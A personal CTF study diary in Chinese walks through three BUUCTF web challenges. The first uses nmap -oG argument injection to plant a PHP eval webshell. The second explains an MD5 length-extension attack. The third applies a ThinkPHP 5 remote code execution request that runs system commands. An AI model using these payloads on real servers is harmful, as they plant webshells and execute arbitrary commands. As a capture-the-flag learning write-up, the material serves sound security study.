# buu摸鱼日记（6）

昨天状态不好，摸了

## [BUUCTF 2018]Online Tool

说实话，刚开始一点头绪都没有

这类题做得少

看了wp才发现，真tm简单

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

先去查了$_SERVER是啥，请求数组什么的，里面是请求头里的东西（其实根本不用管）

关键在于那个host

> 
>
> escapeshellarg ( string `$arg` ) : string
>
> **escapeshellarg()** 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 [exec()](https://www.php.net/manual/zh/function.exec.php), [system()](https://www.php.net/manual/zh/function.system.php) [执行运算符](https://www.php.net/manual/zh/language.operators.execution.php) 
>
> escapeshellcmd ( string `$command` ) : string
>
> **escapeshellcmd()** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 [exec()](https://www.php.net/manual/zh/function.exec.php) 或 [system()](https://www.php.net/manual/zh/function.system.php) 函数，或者 [执行操作符](https://www.php.net/manual/zh/language.operators.execution.php) 之前进行转义。

这里有转义，所以管道什么的肯定是不行了。由于我没怎么用过nmap（好吧我承认我是个菜家伙），不知道命令，看了wp才知道nmap有一个参数-oG可以实现将命令和结果写到文件

呢么直接传马

根目录有flag（又是根目录）

```php
host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
```

## [De1CTF 2019]SSRF Me

一进来就是flask源码，我有点懵逼

题目不难 就是hash长度拓展攻击（就是我看着这个代码审计晕了）

通过审计 调用方法 拿flag

就是在不知道key的具体值的时候 我们可以通过某些条件比如key的长度 某个已知明文通过MD5($key.已知明文)MD5值去推MD5($key.任意值)的MD5

```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

这里就是我们已知 secert_key + param + action(scan)值， 

~~我怎么感觉这题和ssrf没啥关系~~

## [BJDCTF 2nd]old-hack

被吊打

查了一下发现是thinkphp的洞

随便getpost值 就可以让他报错

就可以看到一大堆信息

对应版本有这个[rce漏洞](https://blog.csdn.net/xuandao_ahfengren/article/details/86333189)

[RCE thinkphp分析](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)

```
http://0f9f5bc1-7b35-447d-9468-ee4a2bf28c86.node3.buuoj.cn/?s=captcha

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat  /flag
```

